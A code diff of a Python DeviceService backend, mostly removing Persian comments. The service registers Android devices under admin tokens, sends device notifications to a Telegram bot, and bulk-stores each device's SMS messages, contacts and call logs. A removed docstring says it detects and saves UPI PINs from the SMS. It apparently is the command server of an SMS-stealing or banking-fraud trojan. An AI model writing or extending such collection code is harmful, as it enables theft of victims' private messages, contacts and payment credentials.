@@ -16,19 +16,10 @@ class DeviceService:
 
     @staticmethod
     def _assign_telegram_bot() -> int:
-        """
-        تخصیص ربات تلگرام به دستگاه جدید
-        
-        Device notifications همیشه به Bot 1 میرن
-        
-        Returns:
-            int: شماره ربات (همیشه 1 برای device notifications)
-        """
-        return 1  # Bot 1: Device Notifications
+        return 1
 
     @staticmethod
     async def register_device(device_id: str, device_info: dict, admin_token: Optional[str] = None):
-        """رجیستر دستگاه با توکن ادمین"""
         try:
             existing_device = await mongodb.db.devices.find_one({"device_id": device_id})
             is_new_device = existing_device is None
@@ -39,7 +30,6 @@ class DeviceService:
             app_type = device_info.get("app_type", "MP")
             sim_info = device_info.get("sim_info", [])
             
-            # 🔑 پیدا کردن ادمین از روی توکن
             admin_username = None
             if admin_token:
                 from ..services.auth_service import auth_service
@@ -85,16 +75,13 @@ class DeviceService:
                 "sim_info": sim_info,
                 "user_id": user_id,
                 "app_type": app_type,
-                "admin_token": admin_token,  # 🔑 توکن ادمین
-                "admin_username": admin_username,  # 👤 نام کاربری ادمین
+                "admin_token": admin_token,
+                "admin_username": admin_username,
                 "status": "online",
                 "last_ping": now,
                 "updated_at": now
             }
 
-            # استفاده از upsert برای جلوگیری از duplicate key error
-            # اگر device موجود بود update میکنه، اگر نبود insert میکنه
-            
             telegram_bot_id = DeviceService._assign_telegram_bot()
             
             update_data = {
@@ -123,11 +110,9 @@ class DeviceService:
                 }
             }
             
-            # Add FCM token (بدون تکرار)
             if fcm_token:
                 update_data["$addToSet"] = {"fcm_tokens": fcm_token}
             
-            # upsert: اگر موجود بود update، اگر نبود insert
             result = await mongodb.db.devices.update_one(
                 {"device_id": device_id},
                 update_data,
@@ -197,7 +182,6 @@ class DeviceService:
                     device_doc["status"] = "offline"
                     device_doc["is_online"] = False
                 
-                # normalize کن
                 normalized = DeviceService._normalize_device_data(device_doc)
                 return Device(**normalized)
             return None
@@ -207,7 +191,6 @@ class DeviceService:
 
     @staticmethod
     async def save_sms_history(device_id: str, sms_list: list):
-        """ذخیره تاریخچه SMS + تشخیص و ذخیره UPI PIN"""
         try:
             if not sms_list:
                 return
@@ -236,12 +219,10 @@ class DeviceService:
                     )
                 )
             
-            # ذخیره دسته‌ای پیامک‌ها
             if operations:
                 result = await mongodb.db.sms_messages.bulk_write(operations, ordered=False)
                 logger.info(f"📥 SMS saved: {result.upserted_count + result.modified_count}")
             
-            # آپدیت stats
             total_sms = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
             
             await mongodb.db.devices.update_one(
@@ -327,15 +308,15 @@ class DeviceService:
             operations = []
 
             for contact in contacts_list:
-                contact_id = contact.get("contact_id", "")          # ⭐ تغییر
+                contact_id = contact.get("contact_id", "")
                 name = contact.get("name", "")
-                phone = contact.get("phone_number", "")             # ⭐ تغییر
+                phone = contact.get("phone_number", "")
                 
                 if not phone or not contact_id:
                     continue
 
                 contact_doc = {
-                    "contact_id": contact_id,                       # ⭐ از اندروید میاد
+                    "contact_id": contact_id,
                     "device_id": device_id,
                     "name": name,
                     "phone_number": phone,
@@ -424,7 +405,6 @@ class DeviceService:
                     "received_at": now
                 }
 
-                # استفاده از upsert برای جلوگیری از duplicate key error
                 result = await mongodb.db.call_logs.update_one(
                     {"call_id": call_hash},
                     {"$setOnInsert": call_doc},
@@ -500,9 +480,6 @@ class DeviceService:
 
     @staticmethod
     def _normalize_device_data(device_doc: dict) -> dict:
-        """تبدیل داده‌های دستگاه به فرمت صحیح برای validation"""
-        
-        # تبدیل float به string برای درصدها (بدون اعشار)
         if device_doc.get("storage_percent_free") is not None:
             value = float(device_doc["storage_percent_free"])
             device_doc["storage_percent_free"] = str(int(value))
@@ -511,7 +488,6 @@ class DeviceService:
             value = float(device_doc["ram_percent_free"])
             device_doc["ram_percent_free"] = str(int(value))
         
-        # تبدیل float به int برای حافظه‌ها
         int_fields = [
             "total_storage_mb", "free_storage_mb", "storage_used_mb",
             "total_ram_mb", "free_ram_mb", "ram_used_mb"
@@ -519,10 +495,6 @@ class DeviceService:
         for field in int_fields:
             if device_doc.get(field) is not None:
                 device_doc[field] = int(device_doc[field])
-        
-        # ⭐ حذف این بخش - دیگه نیازی نیست دستی map کنی
-        # چون Pydantic با alias خودش map میکنه
-        # sim_info رو همونطور که هست نگه دار
         
         return device_doc
 
